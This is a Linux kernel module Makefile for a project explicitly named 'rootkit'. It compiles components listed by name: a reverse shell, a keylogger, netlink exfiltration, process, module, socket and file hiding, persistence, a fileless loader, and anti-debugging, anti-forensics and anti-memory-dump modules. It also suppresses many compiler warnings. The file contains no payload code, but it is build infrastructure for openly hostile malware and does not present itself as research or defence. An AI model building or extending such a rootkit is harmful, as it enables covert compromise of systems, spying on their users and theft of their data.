obj-m := rootkit.o

ROOTKIT_DIR := $(PWD)
SRC_DIR := $(ROOTKIT_DIR)/src
INC_DIR := $(ROOTKIT_DIR)/include

EXTRA_CFLAGS += -I$(INC_DIR)

EXTRA_CFLAGS += -Wno-error
EXTRA_CFLAGS += -Wno-implicit-function-declaration
EXTRA_CFLAGS += -Wno-missing-prototypes
EXTRA_CFLAGS += -Wno-unused-variable
EXTRA_CFLAGS += -Wno-unused-function
EXTRA_CFLAGS += -Wno-return-type
EXTRA_CFLAGS += -Wno-incompatible-pointer-types
EXTRA_CFLAGS += -Wno-format-security
EXTRA_CFLAGS += -Wno-address

ROOTKIT_OBJS := \
    ftrace_hook.o \
    string_encrypt.o \
    hmac_auth.o \
    persistence.o \
    directory_encrypt.o \
    anti_debug.o \
    watchdog.o \
    inline_hook.o \
    netfilter_trigger.o \
    process_hiding.o \
    module_hiding.o \
    socket_hiding.o \
    syscall_hook.o \
    reverse_shell.o \
    keylogger.o \
    anti_forensics.o \
    packet_filter.o \
    anti_watchdog.o \
    vfs_file_hiding.o \
    command_executor.o \
    delayed_activation.o \
    fileless_loader.o \
    self_watchdog.o \
    unload_protection.o \
    anti_memdump.o \
    sysctl_hiding.o \
    breakpoint_detector.o \
    netlink_exfil.o \
    anti_kprobe.o \
    recovery_trigger.o \
    trace_disabler.o \
    heap_encrypt.o \
    key_injector.o \
    rootkit_core.o \
    memory_utils.o \
    write_protection.o \
    ftrace_regs.o

rootkit-objs := $(addprefix src/, $(ROOTKIT_OBJS))

all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(ROOTKIT_DIR) modules

clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(ROOTKIT_DIR) clean
